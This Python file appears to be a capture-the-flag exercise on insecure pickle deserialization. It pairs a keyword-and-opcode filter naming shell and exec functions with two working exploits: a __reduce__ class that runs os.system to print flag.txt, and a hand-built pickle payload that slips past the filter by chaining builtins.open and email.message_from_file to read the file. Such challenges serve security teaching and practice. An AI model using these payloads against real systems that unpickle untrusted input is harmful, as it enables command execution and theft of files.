import pickle
import pickletools
import os
import platform
import struct


class TestClass:
    def __init__(self, test_value):
        self.test_attribute = test_value

    def __str__(self):
        return "[Test object -> %s]" % self.test_attribute


def my_serialize(obj):
    serialized = pickle.dumps(obj)
    print("[*] Serialized object: %s" % serialized)
    return serialized


def my_deserialize(obj):
    if obj is None:
        print("[*] Nothing to deserialize.")
        return None
    security_check(obj)  # You shall not pass! Maybe... ^^
    return pickle.loads(obj)


class AttackDetected(Exception):
    pass


def security_check(obj):
    print("[*] Checking the input to prevent attacks.")
    bad_words = ("system", "Popen", "call", "eval", "hread", "proc",
                 "exec", "run", "pexpect", "sh", "plumbum", "fabric", "envoy")
    bad_op_code = "REDUCE"
    attack_detected = False
    for op_code, arg, pos in pickletools.genops(obj):
        print("[*]     op_code.name = '%s', arg = '%s', op_code.pos = '%s'" % (op_code.name, arg, pos))
        if op_code.name in bad_op_code:
            attack_detected = True
            print("[!]        ^... Found malicious content (op_code.name)!")
        if isinstance(arg, bytes):
            arg = str(arg.decode("utf-8"))
        if arg and isinstance(arg, str) and any(bw in arg for bw in bad_words):
            attack_detected = True
            print("[!]        ^... Found malicious content (arg)!")
    if attack_detected:
        raise AttackDetected()
    else:
        print("[*] Input is good.")


class OldRCE:
    def __reduce__(self):
        print_file_command = "cat"
        if "windows" in platform.system().lower():
            print_file_command = "type"
        command = "%s flag.txt" % print_file_command
        return os.system, (command, )


def my_old_exploit():
    serialized_exploit = pickle.dumps(OldRCE())
    print("[*] Serialized exploit object: %s" % serialized_exploit)
    return serialized_exploit


def my_exploit():
    filename = "flag.txt"
    payload = b"(("
    # __builtins__.open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)
    payload += b"X" + bytes(struct.pack("<I", len(filename))) + bytes(filename, encoding="utf-8")
    payload += b"ibuiltins\nopen\n"
    # email.message_from_file(fp, _class=None, *, policy=policy.compat32)
    payload += b"iemail\nmessage_from_file\n"
    payload += b"."
    # The payload is equivalent to: email.message_from_file(__builtins__.open(filename))
    print("[*] Serialized exploit object: %s" % payload)
    return payload


if __name__ == '__main__':
    print("Insecure Deserialization - Challenge 2")

    print("\nLet's create a test object.")
    test_object = TestClass("this is a test")
    print("[*] Object: %s" % test_object)

    print("\nLet's serialize it.")
    serialized_object = my_serialize(test_object)

    print("\nNow let's try to deserialize it to obtain the initial object.")
    deserialized_object = my_deserialize(serialized_object)
    print("[*] Object: %s" % deserialized_object)

    print("\nIs the old exploit still working?")
    exploit_object = my_old_exploit()
    try:
        deserialized_object = my_deserialize(exploit_object)
        print("[*] Object: %s" % deserialized_object)
    except AttackDetected:
        print("[!] Attack detected!")

    print("\nYou have to read \"flag.txt\" file.")
    print("Can you exploit it? :)")
    exploit_object = my_exploit()
    try:
        deserialized_object = my_deserialize(exploit_object)
        print("[*] Object: %s" % deserialized_object)
    except AttackDetected:
        print("[!] Attack detected!")

    print()
